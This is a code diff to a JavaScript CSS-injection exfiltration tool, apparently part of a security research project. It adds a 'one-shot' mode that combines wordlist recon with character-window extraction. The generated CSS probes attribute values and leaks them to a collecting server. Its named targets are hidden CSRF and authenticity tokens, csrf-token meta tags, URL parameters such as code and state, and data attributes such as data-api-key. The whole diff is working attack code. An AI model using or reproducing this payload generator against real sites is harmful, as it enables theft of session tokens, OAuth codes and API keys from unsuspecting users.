@@ -2,7 +2,9 @@
 // Loaded by public/index.html after payload.js, and required by the server and
 // tests in Node so all of them use the same rules.
 //
-// It's two stages because CSS without @import is a single static stylesheet:
+// Full blind mode has two stages because CSS cannot insert a discovered name
+// into a request URL. One-shot mode combines recon with one shared extraction
+// lane per field kind; it works when only one name in a lane is present.
 //
 //   1. Recon. Wordlist probes report which fields exist (CSS can't enumerate
 //      attribute names or read values, so names can only be guessed), whether
@@ -92,17 +94,20 @@
   // Recon kinds, the wordlist each one's names come from, and what a hit means.
   const RECON_KINDS = {
     i: INPUT_NAMES, // input exists
+    iv: INPUT_NAMES, // input value is non-empty (one-shot collision check)
     if: INPUT_NAMES, // ...and its form renders (it's the extraction host)
     ih: INPUT_NAMES, // ...and its value is lowercase hex
     ib: INPUT_NAMES, // ...and its value only has base64 chars
     iw: INPUT_NAMES, // ...and its value only has base64url chars
     m: META_NAMES, // meta exists (and renders, which always works)
+    mv: META_NAMES, // meta content is non-empty
     mh: META_NAMES, // ...and its content is lowercase hex
     mb: META_NAMES, // ...base64
     mw: META_NAMES, // ...base64url
     a: URL_PARAMS, // a link has ?name= or &name=
     f: URL_PARAMS, // a form action has ?name= or &name=
     d: DATA_ATTRS, // an element has the data attribute
+    dv: DATA_ATTRS, // data attribute is non-empty
     ds: DATA_ATTRS, // ...and that element renders (it's the extraction host)
     dh: DATA_ATTRS, // ...and its value is lowercase hex
     db: DATA_ATTRS, // ...base64
@@ -283,6 +288,13 @@
   // --- stage 1: recon ----------------------------------------------------------
 
   const TARGETS = ['input', 'meta', 'url', 'data'];
+  const ONE_SHOT_INPUT_NAMES = ['csrf', 'csrf_token', 'token', 'authenticity_token', 'nonce'];
+  const ONE_SHOT_META_NAMES = ['csrf-token', 'csrf', 'token', 'nonce'];
+  const ONE_SHOT_URL_NAMES = ['token', 'code', 'state', 'key', 'csrf'];
+  const ONE_SHOT_DATA_NAMES = ['data-csrf-token', 'data-token', 'data-api-key', 'data-nonce', 'data-key'];
+  // The union of supported non-hex alphabets. One probe set covers all whole
+  // values; recon selects the narrower alphabet for reconstruction afterward.
+  const ONE_SHOT_CHARSET = { fold: '0123456789abcdefghijklmnopqrstuvwxyz+/=-_', cased: true, windows: [3] };
 
   function reconPayload(cfg = {}) {
     const targets = new Set(cfg.targets || TARGETS);
@@ -298,19 +310,27 @@
     };
 
     if (targets.has('input')) {
+      const matchInput = name => cfg.nonEmpty
+        ? withTests(inputMatch(name), { attrs: [['type', '=', 'hidden', true]] }) : inputMatch(name);
       INPUT_NAMES.forEach(w => {
-        probe('html', 'html', inputMatch(w), 'i', w);
-        probe('form', 'form', inputMatch(w), 'if', w);
+        const match = matchInput(w);
+        probe('html', 'html', match, 'i', w);
+        probe('form', 'form', match, 'if', w);
+        if (cfg.nonEmpty) probe('html', 'html', withTests(match, {
+          attrs: [['value']], not: [['value', '=', '']],
+        }), 'iv', w);
       });
       // Each long charset test is identical for every name. Factor it into
       // one parent rule; these probes have distinct properties, so moving
       // them together does not change cascade order or the requests.
       for (const [suffix, charset] of CHARSET_PROBES) {
         const only = charsetOnly('value', charset);
-        const group = { tag: 'input', ...only };
+        const group = { tag: 'input', ...only,
+          attrs: cfg.nonEmpty ? [...only.attrs, ['type', '=', 'hidden', true]] : only.attrs };
         INPUT_NAMES.forEach(w => {
-          const test = { attrs: inputMatch(w).attrs };
-          probe('html', 'html', withTests(inputMatch(w), only), 'i' + suffix, w, group, test);
+          const match = matchInput(w);
+          const test = { attrs: match.attrs };
+          probe('html', 'html', withTests(match, only), 'i' + suffix, w, group, test);
         });
       }
       probe('html', 'html', {
@@ -322,6 +342,9 @@
     if (targets.has('meta')) {
       META_NAMES.forEach(w => {
         probe('meta', 'self', metaMatch(w), 'm', w);
+        if (cfg.nonEmpty) probe('meta', 'self', withTests(metaMatch(w), {
+          not: [['content', '=', '']],
+        }), 'mv', w);
       });
       for (const [suffix, charset] of CHARSET_PROBES) {
         const only = charsetOnly('content', charset);
@@ -343,6 +366,9 @@
       DATA_ATTRS.forEach(w => {
         probe('html', 'html', dataMatch(w), 'd', w);
         probe('data', 'self', dataMatch(w), 'ds', w);
+        if (cfg.nonEmpty) probe('html', 'html', withTests(dataMatch(w), {
+          not: [[w, '=', '']],
+        }), 'dv', w);
         // Each attribute's charset probes share the common rejects in one
         // parent rule, nesting only their own (`html:has(&:not(...))`).
         const group = anyCharset(w);
@@ -398,6 +424,16 @@
     const kind = FIELD_KINDS[field.kind];
     if (!kind) throw new Error('unknown field kind ' + field.kind);
     const whole = kind.whole;
+    if (field.names) {
+      const names = field.names;
+      switch (field.kind) {
+        case 'input': return { match: { tag: 'input', attrs: [['type', '=', 'hidden', true]], is: names.map(n => ['name', '=', n, true]) }, attr: 'value', whole };
+        case 'meta': return { match: { tag: 'meta', attrs: [['content']], is: names.map(n => ['name', '=', n, true]) }, attr: 'content', whole };
+        case 'data': return { match: { is: names.map(n => [n]) }, attr: null, whole };
+        case 'a': return { match: { tag: 'a', is: names.map(n => ['href', '*=', n + '=', true]) }, attr: 'href', whole };
+        case 'form': return { match: { tag: 'form', is: names.map(n => ['action', '*=', n + '=', true]) }, attr: 'action', whole };
+      }
+    }
     switch (field.kind) {
       case 'input': return { match: inputMatch(field.name), attr: 'value', whole };
       case 'meta': return { match: metaMatch(field.name), attr: 'content', whole };
@@ -475,19 +511,21 @@
     let displayMeta = false;
     for (const field of fields) {
       const { match, attr, whole } = fieldTarget(field);
-      const cs = charsetOf(field.charset);
-      const k = windowSizeFor(field.charset, field.windowSize);
+      const cs = field.charset === 'auto' ? ONE_SHOT_CHARSET : charsetOf(field.charset);
+      const k = field.charset === 'auto' ? 3 : windowSizeFor(field.charset, field.windowSize);
       // Non-hex windows and anchors are case-insensitive; case pairs aren't.
       const ci = cs.cased;
       const scope = field.host === 'form' || field.host === 'html' ? field.host : 'self';
       const id = field.id;
       const key = hostKey(field);
-      if (key === 'data') dataNames.push(field.name);
+      if (key === 'data') dataNames.push(...(field.names || [field.name]));
       if (!shared.has(key)) shared.set(key, new Set());
       const props = shared.get(key);
       const rule = (test, prop, path) => {
-        rules.push({ scope, match: withTests(match, { attrs: [test] }), group: match,
-          test: { attrs: [test] }, prop, path: `b/${id}/${path}` });
+        const tests = attr ? { attrs: [test] } : { is: field.names.map(name => [name, test[1], test[2], test[3]]) };
+        const fullMatch = attr ? withTests(match, tests) : tests;
+        rules.push({ scope, match: fullMatch, group: match,
+          test: tests, prop, path: `b/${id}/${path}` });
         props.add(prop);
       };
 
@@ -497,7 +535,8 @@
         else {
           // Both separators set the same property and URL at the same
           // specificity, so one :is() retains both probes and their order.
-          const test = { is: [...'?&'].map(sep => [attr, '*=', `${sep}${field.name}=${a}`, true]) };
+          const test = { is: (field.names || [field.name]).flatMap(name =>
+            [...'?&'].map(sep => [attr, '*=', `${sep}${name}=${a}`, true])) };
           rules.push({ scope, match: { tag: match.tag, ...test }, group: match,
             test, prop: `s${id}-`, path: `b/${id}/s/${pathChunk(a)}` });
           props.add(`s${id}-`);
@@ -534,13 +573,68 @@
       data: { scope: 'self', match: { is: [...new Set(dataNames)].map(w => [w]) } },
     };
     const hosts = [...shared].map(([key, props]) => ({ ...HOSTS[key], props: [...props] }));
+    if (fields.some(f => f.names)) {
+      // Use precisely the recon host selectors so render() can combine their
+      // background lists. Otherwise one declaration would hide the other.
+      for (const host of hosts) {
+        if (host.match?.tag === 'meta') host.match = { tag: 'meta', attrs: [['name']] };
+        if (host.match?.tag === 'a') host.match = { tag: 'a', attrs: [['href', '*=', '=']] };
+        if (host.scope === 'self' && !host.match?.tag && host.match?.is) {
+          host.match = { is: DATA_ATTRS.map(w => [w]) };
+        }
+      }
+    }
     return { rules, hosts, displayMeta };
   }
 
   const generateBlindCSS = (fields, server) => render(extractPayload(fields), server);
 
+  function oneShotFields(cfg = {}, firstId = 0) {
+    const targets = new Set(cfg.targets || TARGETS);
+    const dataNames = (cfg.dataNames || ONE_SHOT_DATA_NAMES).filter(n => DATA_ATTRS.includes(n));
+    const urlCharset = ['hex', 'alnum', 'base64', 'base64url'].includes(cfg.urlCharset) ? cfg.urlCharset : 'hex';
+    const urlWindow = windowSizeFor(urlCharset, cfg.urlWindow);
+    const fields = [];
+    const add = (kind, names, charset, windowSize, host) => {
+      if (names.length) fields.push({ id: firstId + fields.length, kind, names, charset, windowSize, host });
+    };
+    if (targets.has('input')) add('input', cfg.inputNames || ONE_SHOT_INPUT_NAMES, 'auto', 3, 'html');
+    if (targets.has('meta')) add('meta', cfg.metaNames || ONE_SHOT_META_NAMES, 'auto', 3, 'self');
+    if (targets.has('url')) {
+      const urlKinds = cfg.urlKinds || ['a'];
+      if (urlKinds.includes('a')) add('a', cfg.urlNames || ONE_SHOT_URL_NAMES, urlCharset, urlWindow, 'self');
+      if (urlKinds.includes('form')) add('form', cfg.urlNames || ONE_SHOT_URL_NAMES, urlCharset, urlWindow, 'self');
+    }
+    if (targets.has('data')) add('data', dataNames, 'auto', 3, 'self');
+    return fields;
+  }
+
+  function oneShotPayload(fields, cfg = {}) {
+    const recon = reconPayload({ ...cfg, nonEmpty: true });
+    const extract = extractPayload(fields);
+    const hosts = new Map();
+    for (const host of [...recon.hosts, ...extract.hosts]) {
+      const selector = hostSelector(host);
+      if (!hosts.has(selector)) hosts.set(selector, { ...host, props: [] });
+      const props = hosts.get(selector).props;
+      for (const prop of host.props) props.push(prop);
+    }
+    const capacity = MAX_LAYERS_PER_BOX * (1 + PSEUDO_BOXES.length);
+    for (const [selector, host] of hosts) {
+      if (host.props.length > capacity) {
+        throw new Error(`one-shot host ${selector} needs ${host.props.length} layers (limit ${capacity}); select fewer targets`);
+      }
+    }
+    return { rules: [...recon.rules, ...extract.rules], hosts: [...hosts.values()],
+      displayMeta: recon.displayMeta || extract.displayMeta };
+  }
+
+  const generateOneShotCSS = (fields, cfg, server) => render(oneShotPayload(fields, cfg), server);
+
   const api = {
     INPUT_NAMES, META_NAMES, URL_PARAMS, DATA_ATTRS, RECON_KINDS, FIELD_KINDS, TARGETS,
+    ONE_SHOT_INPUT_NAMES, ONE_SHOT_META_NAMES, ONE_SHOT_URL_NAMES, ONE_SHOT_DATA_NAMES,
+    ONE_SHOT_CHARSET, oneShotFields, oneShotPayload, generateOneShotCSS,
     renderMatch, render, reconPayload, generateReconCSS, fieldsFromRecon,
     fieldTarget, assignHosts, extractPayload, generateBlindCSS,
   };
